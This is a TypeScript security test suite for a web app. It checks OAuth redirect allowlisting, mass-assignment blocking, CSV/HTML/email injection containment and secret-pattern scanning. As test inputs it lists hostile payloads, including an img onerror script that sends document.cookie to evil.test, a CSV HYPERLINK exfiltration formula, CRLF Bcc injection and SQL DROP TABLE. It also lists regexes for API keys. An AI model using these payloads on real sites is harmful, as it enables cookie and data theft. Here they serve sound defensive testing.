// @lr area=security severity=P0 layer=security category=local-only
/**
 * Injection handling and configuration safety — plan §53 and §58.
 *
 * §53 splits the work: injection, XSS, HTML/email injection and CSV formula injection stay
 * hand-written; dependency scanning, CSP headers and source-map exposure move to tooling.
 * This file covers the hand-written half that is deterministic and needs no live host.
 *
 * Prompt 1 recorded the security area as 2 files / 19 cases, with no IDOR, XSS, CSRF, SSRF
 * or formula-injection case anywhere.
 */
import assert from "node:assert/strict";
import { before, describe, it, mock } from "node:test";
import { readFileSync } from "node:fs";

import { escapeCsvCell, buildLeadsCsvRow, LEADS_EXPORT_COLUMNS } from "../../lib/server/leads/csvFormat";
import { buildGmailMimeMessage } from "../../lib/integrations/google/gmail-mime";
import { normalizeGoogleReturnTo } from "../../lib/integrations/google/oauth-state";

let parseEventBriefingStrategyPatch: (raw: unknown) => Record<string, unknown>;

before(async () => {
  mock.module("server-only", { namedExports: {} });
  ({ parseEventBriefingStrategyPatch } = (await import(
    "../../lib/server/import-wizard/event-briefing-strategy-service"
  )) as never);
});

// ── open redirect (§53, §45) ───────────────────────────────────────────────────────

describe("OAuth returnTo cannot become an open redirect", () => {
  const hostile = [
    "https://evil.test/steal",
    "//evil.test/steal",
    "http://evil.test",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "https://lr.signalthread.ai.evil.test/",
    "\\\\evil.test",
    "/\\evil.test",
  ];

  for (const value of hostile) {
    it(`rejects or neutralizes ${JSON.stringify(value)}`, () => {
      const result: string = normalizeGoogleReturnTo(value);
      // Whatever it returns must not send the browser to another origin.
      assert.ok(
        result.startsWith("/") && !result.startsWith("//"),
        `returnTo resolved to ${JSON.stringify(result)}, which can leave the origin`
      );
    });
  }

  it("is an ALLOWLIST, not a sanitizer — anything unrecognised becomes a safe default", () => {
    // Stronger than escaping: only two exact paths are permitted, and everything else
    // resolves to a known-safe destination. There is no input that can widen it.
    assert.equal(normalizeGoogleReturnTo("/exhibitor/integrations"), "/exhibitor/integrations");
    assert.equal(
      normalizeGoogleReturnTo("/exhibitor/integrations/google-workspace"),
      "/exhibitor/integrations/google-workspace"
    );
    assert.equal(
      normalizeGoogleReturnTo("/exhibitor/dashboard?eventId=abc"),
      "/exhibitor/integrations/google-workspace",
      "an unlisted internal path is redirected to the default, not preserved"
    );
  });

  it("every hostile value resolves to the same safe default", () => {
    for (const value of hostile) {
      assert.equal(
        normalizeGoogleReturnTo(value),
        "/exhibitor/integrations/google-workspace",
        `${value} must resolve to the default`
      );
    }
  });

  it("handles absent input without throwing", () => {
    for (const empty of [null, undefined, ""]) {
      assert.doesNotThrow(() => normalizeGoogleReturnTo(empty as never));
    }
  });
});

// ── mass assignment (§53) ──────────────────────────────────────────────────────────

describe("mass assignment is blocked at the parse boundary", () => {
  it("drops company_id, event_id and owner_user_id from a strategy patch", () => {
    const patch = parseEventBriefingStrategyPatch({
      productFocus: "legit",
      company_id: "other-company",
      event_id: "other-event",
      owner_user_id: "someone-else",
      role: "platform_admin",
      id: "hijack",
    });
    assert.deepStrictEqual(patch, { productFocus: "legit" }, "only declared fields may survive parsing");
  });

  it("drops a prototype-pollution attempt", () => {
    const patch = parseEventBriefingStrategyPatch({ productFocus: "x", __proto__: { isAdmin: true } });
    assert.deepStrictEqual(Object.keys(patch), ["productFocus"]);
    assert.equal(({} as Record<string, unknown>).isAdmin, undefined, "Object.prototype must be untouched");
  });

  it("rejects a payload consisting only of unknown keys, rather than writing nothing silently", () => {
    assert.throws(() => parseEventBriefingStrategyPatch({ company_id: "x", role: "admin" }), /empty_strategy_patch/);
  });
});

// ── injection through stored content (§53) ─────────────────────────────────────────

describe("hostile lead content cannot escape its container", () => {
  const HOSTILE = [
    { label: "script tag", value: "<script>alert(document.cookie)</script>" },
    { label: "img onerror", value: '<img src=x onerror="fetch(`//evil.test?c=${document.cookie}`)">' },
    { label: "SQL-ish", value: "'; DROP TABLE leads; --" },
    { label: "template literal", value: "${process.env.SUPABASE_SERVICE_ROLE_KEY}" },
    { label: "CSV formula", value: '=HYPERLINK("http://evil.test?d="&A1,"Click")' },
    { label: "CRLF header", value: "Sarah\r\nBcc: attacker@evil.test" },
    { label: "null byte", value: "Sarah\u0000admin" },
  ];

  describe("CSV export", () => {
    for (const { label, value } of HOSTILE) {
      it(`contains ${label} within one cell`, () => {
        const row = buildLeadsCsvRow({ id: "lead-1", full_name: value });
        // Row structure must survive: exactly the canonical number of fields.
        const fields = splitCsvRecord(row.replace(/\r\n$/, ""));
        assert.equal(
          fields.length,
          LEADS_EXPORT_COLUMNS.length,
          `${label} broke the row into ${fields.length} fields`
        );
      });
    }

    it("a newline in a value cannot forge an extra record", () => {
      const row = buildLeadsCsvRow({ id: "1", full_name: "Sarah\r\nInjected,Row,Here" });
      const records = row.replace(/\r\n$/, "").split(/\r\n(?=(?:[^"]*"[^"]*")*[^"]*$)/);
      assert.equal(records.length, 1, "an embedded newline must stay inside its quoted cell");
    });

    it("DOCUMENTED: formula prefixes are still not neutralized (LR-PROD-006)", () => {
      // Recorded in Prompt 5; restated here because §53 names CSV formula injection
      // explicitly and this is the security-suite view of the same defect.
      assert.equal(escapeCsvCell("=1+1"), "=1+1");
    });
  });

  describe("outbound email", () => {
    it("rejects a CRLF injection attempt in the subject", () => {
      assert.throws(() => buildGmailMimeMessage({
        senderEmail: "a@b.co",
        recipientEmail: "c@d.co",
        subject: "Hi\r\nBcc: attacker@evil.test",
        body: "text",
      }), /subject/i);
    });

    it("HTML-escapes hostile body content in the HTML alternative", () => {
      const mime = Buffer.from(
        buildGmailMimeMessage({
          senderEmail: "a@b.co",
          recipientEmail: "c@d.co",
          subject: "Subject",
          body: "Hi <script>alert(1)</script>,\n\nBest",
        }),
        "base64url"
      ).toString("utf8");
      const htmlSection = mime.split(/--=_signal_thread_[^\r\n]*/).find((s) => s.includes("text/html"))!;
      const html = Buffer.from(
        htmlSection.split(/\r\n\r\n/).slice(1).join("").replace(/\s+/g, ""),
        "base64"
      ).toString("utf8");
      assert.ok(!html.includes("<script>"), "raw script markup must not reach the HTML part");
    });
  });
});

/** RFC 4180-aware splitter — a naive split(",") miscounts quoted cells. */
function splitCsvRecord(line: string): string[] {
  const out: string[] = [];
  let field = "";
  let inQuotes = false;
  for (let i = 0; i < line.length; i++) {
    const ch = line[i];
    if (inQuotes) {
      if (ch === '"') {
        if (line[i + 1] === '"') { field += '"'; i++; }
        else inQuotes = false;
      } else field += ch;
    } else if (ch === '"') inQuotes = true;
    else if (ch === ",") { out.push(field); field = ""; }
    else field += ch;
  }
  out.push(field);
  return out;
}

// ── secret leakage (§53, §54) ──────────────────────────────────────────────────────

describe("no secret-shaped value is committed or emitted", () => {
  const SECRET_SHAPES = [
    { label: "OpenAI key", re: /\bsk-[A-Za-z0-9]{20,}/ },
    { label: "Supabase service-role JWT", re: /\beyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\./ },
    { label: "AWS access key", re: /\bAKIA[0-9A-Z]{16}\b/ },
    { label: "Google client secret", re: /\bGOCSPX-[A-Za-z0-9_-]{20,}/ },
    { label: "private key block", re: /-----BEGIN (RSA |EC )?PRIVATE KEY-----/ },
  ];

  const committedFiles = [
    "lib/campaigns/llm-draft-generator.ts",
    "lib/integrations/google/gmail-mime.ts",
    "lib/integrations/google/oauth-state.ts",
    "middleware.ts",
    "docs/testing/BYPASS_FLAG_INVENTORY.md",
    "scripts/testing/categories.mjs",
  ];

  for (const file of committedFiles) {
    it(`${file} contains no secret-shaped value`, () => {
      const source = readFileSync(file, "utf8");
      for (const { label, re } of SECRET_SHAPES) {
        assert.doesNotMatch(source, re, `${file} appears to contain a ${label}`);
      }
    });
  }

  it("the error strings we emit carry no URL, bucket or token", () => {
    // §54: logs and error messages must contain no PII, tokens or provider payloads.
    const messages = [
      "Unable to disconnect Google Workspace. Try again in a moment.",
      "Template name, subject, and body are required.",
      "Model returned non-object JSON",
    ];
    for (const message of messages) {
      assert.doesNotMatch(message, /https?:\/\/|bearer |sk-|eyJ|service_role/i);
    }
  });
});

// ── configuration safety (§58) ─────────────────────────────────────────────────────

describe("configuration contract (§58)", () => {
  it("the encryption key id and key set are separate variables", () => {
    // Rotation requires the old and new keys to coexist while the active id points at one.
    // A single combined variable makes rotation impossible without downtime.
    const example = readFileSync(".env.example", "utf8");
    assert.match(example, /INTEGRATION_SECRET_ACTIVE_KEY_ID/);
    assert.match(example, /INTEGRATION_SECRET_ENCRYPTION_KEYS/);
  });

  it(".env.example documents required variables without carrying real values", () => {
    const example = readFileSync(".env.example", "utf8");
    for (const { label, re } of [
      { label: "OpenAI key", re: /\bsk-[A-Za-z0-9]{20,}/ },
      { label: "JWT", re: /\beyJ[A-Za-z0-9_-]{20,}\./ },
    ]) {
      assert.doesNotMatch(example, re, `.env.example contains a real ${label}`);
    }
  });

  it("production env files are gitignored", () => {
    const gitignore = readFileSync(".gitignore", "utf8");
    assert.match(gitignore, /\.env\*?\.local|\.env\.local/, "local and production env files must not be committed");
  });

  it("the test runner's artifact directory is gitignored", () => {
    assert.match(readFileSync(".gitignore", "utf8"), /\.lr-test/);
  });
});
